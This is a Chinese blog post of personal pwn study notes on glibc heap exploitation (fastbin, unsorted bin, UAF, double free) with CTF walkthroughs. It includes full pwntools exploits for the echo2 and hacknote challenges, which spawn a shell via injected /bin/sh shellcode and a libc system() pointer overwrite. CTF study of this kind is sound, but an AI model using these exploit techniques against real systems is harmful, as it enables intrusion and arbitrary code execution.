<p>fast bins可变为small bins（fast bin整体遍历检查时分类）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235237538.png" alt="image-20230618235237538"></p>
<p>BK POINTER 域无实际作用<br>top chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619151359619.png" alt="image-20230619151359619"></p>
<p> malloc state（fastbinsY+bins）在libc数据段管理主进程<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619120041795.png" alt="image-20230619120041795"></p>
<p><strong>什么样的chunk会进入usorted bins</strong><br>刚刚释放（超过fastbin大小）不能进入fastbins且未被分类的</p>
<p>超出fastbins可用大小利用过程：unsorted先乞讨 合并链接凑大小 small large一起来 实在不够喊top<br>先找sortedbins 不够触发sorted遍历 合并unsorted相邻chunk并分类<br>即利用时只要找到比用户申请大的chunk即可 剩余部分为last  remainder chunk转为fastbin部分最后进入unsorted bins</p>
<p><strong>UAF</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160128310.png" alt="image-20230619160128310"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160356676.png" alt="image-20230619160356676"></p>
<p>A free后的内存区</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160410293.png" alt="image-20230619160410293"></p>
<p>在ree chunk和top chunk张放一个malloc chunk阻止两者合并（避免堆管理器的消耗）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619161430277.png" alt="image-20230619161430277"></p>
<p>c分配到a所在的内存区域中 占用利用</p>
<p>gdb偏移下断点方法</p>
<pre><code>b *$rebase(0x..)【偏移】
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193114872.png" alt="image-20230619193114872"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193556660.png" alt="image-20230619193556660"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203856606.png" alt="image-20230619203856606"></p>
<p>第四次malloc后得到栈上地址（堆分配）</p>
<p>free a后<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193754379.png" alt="image-20230619193754379"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619194533056.png" alt="image-20230619194533056"></p>
<p>防止double free漏洞（UAF）：控制内存的指针和内存均需清空 （chunk被清空但指针未清空）<br>意外：低权限指针可因使用同一块内存区域拥有高权限指针功能（若低权限指针篡改返回值高权限指针会无意识传送到pie中）</p>
<pre><code class="c">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
int main()
&#123;
 int * p = malloc(16);
 free(p);
 free(p);
 return 0;
&#125;
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619195914454.png" alt="image-20230619195914454"></p>
<p>tips：<br>1.glibc2.26&#x2F;2.27中无tache检查<br>2.fast bin会检查自身链表中每一个chunk大小是否为规定大小||新进入的chunk是否与上一个chunk重复（报double free 强制退出）</p>
<p>绕过：</p>
<pre><code class="c">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
int main()
&#123;
 int* p = malloc(16);
 malloc(16);
 int* ptr = malloc(16);
 free(p);
 free(ptr);
 free(p);
 return 0;
&#125;
</code></pre>
<p>fastbin_attack<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619202854520.png" alt="image-20230619202854520"></p>
<p>free后fd出现 此时此块chunk对于d来说为malloc chunk可被任意写入值（fd处）<br>fd写入一个stack值 诈骗fast bin过a后下一个free chunk在栈上 【任意霍霍实现】</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203751739.png" alt="image-20230619203751739"><br>注意：fd始终指向下一个chunk开头地址 即stack对应栈上目标地址向上两个字长</p>
<p><strong>unsorted_bin_attcak</strong><br>可以把任意位置的地址篡改成较大的值（实际就是伪造chunk在栈上写一个大数值）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205339973.png" alt="image-20230619205339973"></p>
<p>程序目标将var篡改为较大值<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205857320.png" alt="image-20230619205857320"></p>
<p>unlink移除中间的chunk  新fd和bk中填入unsorted bin中值（fd和bk数据域写入unsorted 地址）最大0x7ff…<br><strong>house_of系列</strong><br>malloc总是接收一个无符号整数 输入负数相当于传入一个超大数<br>整数溢出（超大整数等效于一个负数）<br>top chunk起始地址 + malloc分配空间超出整数内存空间大小–丢弃超出32位部分（最高位）补0 剩下数字变很小（32位表示空间大小）</p>
<p>此时这个很小的数很可能落在data处（？）</p>
<p><strong>FSB&amp;USF例题</strong><br>(1)IDA观察<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155645246.png" alt="image-20230620155645246"></p>
<p>scanf向v7、v8、v9写字符串（开辟的空间是连续的）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620161845271.png" alt="image-20230620161845271"></p>
<p>连续的三个字长缓冲区<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620162028689.png" alt="image-20230620162028689">发现程序标记提示进入对应漏洞查看<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155732238.png" alt="image-20230620155732238"></p>
<p>格式化字符串<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155800172.png" alt="image-20230620155800172"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155817628.png" alt="image-20230620155817628"></p>
<p>free（s）清空了内存但指针未销毁但随着echo3执行完毕对应s栈帧销毁故无影响 但 cleanup（）函数free（0）对应uaf 即o内存被清空但指针未被销毁 此时再用另一指针与o指向同一内存空间即可获取主动权</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620174531638.png" alt="    ">吗 </p>
<p>surprise<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620201633271.png" alt="image-20230620201633271"></p>
<p>echo3free后s使用的空间最后还是留在对应得4字长chunk中  o最后一个参数写入shellcode（greeting） 首地址作为参数进行传参</p>
<pre><code class="python">from pwn import *

p=process(&quot;./echo2&quot;)
elf=ELF(&quot;./echo2&quot;)

p.recvuntil(&quot;hey, what&#39;s your name? : &quot;)
shellcode=b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
p.sendline(shellcode)
p.recvuntil(b&quot;&gt; &quot;)
p.sendline(b&quot;2&quot;)

payload=b&quot;%10$p&quot;+b&quot;A&quot;*3 #A用作标记
p.sendline(payload)
p.recvuntil(b&quot;0x&quot;)
shellcode_addr=int(p.recvuntil(b&#39;AAA&#39;,drop=True),16)-0x20


p.recvuntil(b&quot;&gt; &quot;)
p.sendline(b&quot;4&quot;)
p.recvuntil(b&quot;to exit? (y/n)&quot;)
p.sendline(b&quot;n&quot;)

p.recvuntil(b&quot;&gt; &quot;)
p.sendline(b&quot;3&quot;)
p.recvuntil(b&quot;hello \n&quot;)
p.sendline(b&quot;A&quot;*24+p64(shellcode_addr))
p.interactive()
</code></pre>
<p><strong>hacknote（32位）</strong><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620231326851.png" alt="image-20230620231326851"></p>
<p>​                   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221606653.png" alt="image-20230620221606653"><br>add函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221355683.png" alt="image-20230620221355683"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620220117301.png" alt="image-20230620220117301"></p>
<p>框住部分掌握控制信息 size对应的chunk可由用户自定义（uaf）control上未puts 下为sub</p>
<p>delete函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222639346.png"></p>
<p>由下自上free两个chunk 但指针未被销毁 双free（uaf）<br>攻击第一步：<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222239841.png" alt="image-20230620222239841"></p>
<p>malloc两次（写入垃圾数据的chunk+管理控制信息的chunk）</p>
<p>第二步<br>delete两个chunk 相同大小chunk进入同一fast bin self_puts第一个字长变为fd的第一个其他未变（包括指针）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222903872.png"></p>
<p>malloc两次hou后<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620223247527.png" alt="image-20230620223247527"></p>
<p>传参用self_puts 地址  sub_chunk写入—&gt;puts_got<br>泄露</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620224148329.png" alt="image-20230620224148329"></p>
<p>print（0）对接远程的puts<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230216527.png"></p>
<p>0此时保存的函数地址 获取0的地址进而利用两个chunk块<br>0中第一部分传入system地址（无可避免）用||（或）sh【前一条语句执行失败则执行sh】妙哉<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230551936.png" alt="image-20230620230551936"></p>
<pre><code class="python">from pwn import *
 
#p = remote(&quot;chall.pwnable.tw&quot;,10102)
p=process(&quot;./hacknote&quot;)
elf = ELF(&quot;./hacknote&quot;)
libc = ELF(&quot;./libc_32.so.6&quot;)
read_got = elf.got[&quot;read&quot;]
pfputs = 0x804862b
 
def add_note(size,index):
      p.recvuntil(b&quot;choice :&quot;)
      p.sendline(b&quot;1&quot;)
      p.recvuntil(b&quot;size :&quot;)
      p.sendline(size)
      p.recvuntil(b&quot;Content :&quot;)
      p.sendline(index)
 
def delete_note(index):
      p.recvuntil(b&quot;choice :&quot;)
      p.sendline(b&quot;2&quot;)
      p.recvuntil(b&quot;Index :&quot;)
      p.sendline(index)
 
def print_note(index):
      p.recvuntil(b&quot;choice :&quot;)
      p.sendline(b&quot;3&quot;)
      p.recvuntil(b&quot;Index :&quot;)
      p.sendline(index)

#p.interactive()
add_note(b&quot;16&quot;,b&quot;aaaaa&quot;)
add_note(b&quot;16&quot;,b&quot;aaaaa&quot;)
delete_note(b&#39;0&#39;)
delete_note(b&#39;1&#39;)
add_note(b&#39;8&#39;,p32(pfputs)+p32(read_got))
print_note(b&#39;0&#39;)

pfread = u32(p.recv()[0:4])
pfsys = pfread - 0xd41c0 + 0x3a940
#p.interactive()
delete_note(b&#39;2&#39;)
#p.interactive()
#p.recv()
#p.interactive()
add_note(b&#39;8&#39;,p32(pfsys)+b&quot;||sh&quot;)
print_note(b&#39;0&#39;)
p.interactive()
</code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yubut.github.io">yub</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/">https://yubut.github.io/2023/09/01/【解密系列】pwn基础/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yubut.github.io" target="_blank">幻境</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn-%E7%9F%A5%E8%AF%86%E7%A2%8E%E7%89%87/">pwn,知识碎片</a></div><div class="post_share"><div class="social-share" data-image="https://thumbs.dreamstime.com/b/%E5%8A%A8%E6%BC%AB%E8%83%8C%E6%99%AF%E5%A5%87%E5%B9%BB%E6%8F%92%E5%9B%BE%E6%B8%B8%E6%88%8F%E7%8E%AF%E5%A2%83%E7%AB%A5%E4%B9%A6%E4%BB%99%E5%A2%83%E6%99%AF%E8%A7%82%E6%8F%92%E5%9B%BE-270943592.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/01/ret2csu/" title="ret2csu"><img class="cover" src="https://images.alphacoders.com/131/1311951.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ret2csu</div></div></a></div><div class="next-post pull-right"><a href="/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/" title="解密系列basic"><img class="cover" src="https://images3.alphacoders.com/131/1319293.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">解密系列basic</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/" title="Canary解决姿势"><img class="cover" src="https://www.bizhizj.com/pc-img/2023-04/2146.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-01</div><div class="title">Canary解决姿势</div></div></a></div><div><a href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" title="部分PWN题目记录"><img class="cover" src="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/e4f95a48e6c9c74312ac5ed6fcdc8a14.jpg?x-oss-process=image%2Fresize%2Cm_lfit%2Cw_960%2Ch_540" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-01</div><div class="title">部分PWN题目记录</div></div></a></div><div><a href="/2023/09/01/ret2csu/" title="ret2csu"><img class="cover" src="https://images.alphacoders.com/131/1311951.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-01</div><div class="title">ret2csu</div></div></a></div><div><a href="/2023/11/27/NepCTF%202023/" title="Nep摸鱼记"><img class="cover" src="https://ts2.cn.mm.bing.net/th?id=OIP-C.lXXyg9_hRePKHUIpWoiMUwHaFP&w=297&h=210&c=8&rs=1&qlt=90&o=6&dpr=1.3&pid=3.1&rm=2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-27</div><div class="title">Nep摸鱼记</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yub</div><div class="author-info__description">路迟青</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yubut" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://qm.qq.com/q/Le1ZeB0K40" target="_blank" title=""><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:3023536144@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">程序的编译与链接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">编译过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%91"><span class="toc-number"></span> <span class="toc-text">【花式栈溢出】</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/" title="The Missing Semester of Your CS Education"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRmIfKRi79SHnbd-ASFJ0LTSWOujJAXK7q1H9atswuEUz8CeJQasQ3CloNQlEgjKX1pTP4&amp;usqp=CAU" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="The Missing Semester of Your CS Education"/></a><div class="content"><a class="title" href="/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/" title="The Missing Semester of Your CS Education">The Missing Semester of Your CS Education</a><time datetime="2023-12-24T03:36:16.000Z" title="发表于 2023-12-24 11:36:16">2023-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/27/NepCTF%202023/" title="Nep摸鱼记"><img src="https://ts2.cn.mm.bing.net/th?id=OIP-C.lXXyg9_hRePKHUIpWoiMUwHaFP&amp;w=297&amp;h=210&amp;c=8&amp;rs=1&amp;qlt=90&amp;o=6&amp;dpr=1.3&amp;pid=3.1&amp;rm=2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nep摸鱼记"/></a><div class="content"><a class="title" href="/2023/11/27/NepCTF%202023/" title="Nep摸鱼记">Nep摸鱼记</a><time datetime="2023-11-26T16:00:00.000Z" title="发表于 2023-11-27 00:00:00">2023-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/" title="Canary解决姿势"><img src="https://www.bizhizj.com/pc-img/2023-04/2146.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Canary解决姿势"/></a><div class="content"><a class="title" href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/" title="Canary解决姿势">Canary解决姿势</a><time datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/" title="C探索碎片——操作符"><img src="https://img.tukuppt.com/bg_grid/00/04/53/G7edt37350.jpg!/fh/350" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C探索碎片——操作符"/></a><div class="content"><a class="title" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/" title="C探索碎片——操作符">C探索碎片——操作符</a><time datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" title="部分PWN题目记录"><img src="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/e4f95a48e6c9c74312ac5ed6fcdc8a14.jpg?x-oss-process=image%2Fresize%2Cm_lfit%2Cw_960%2Ch_540" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="部分PWN题目记录"/></a><div class="content"><a class="title" href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" title="部分PWN题目记录">部分PWN题目记录</a><time datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By yub</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>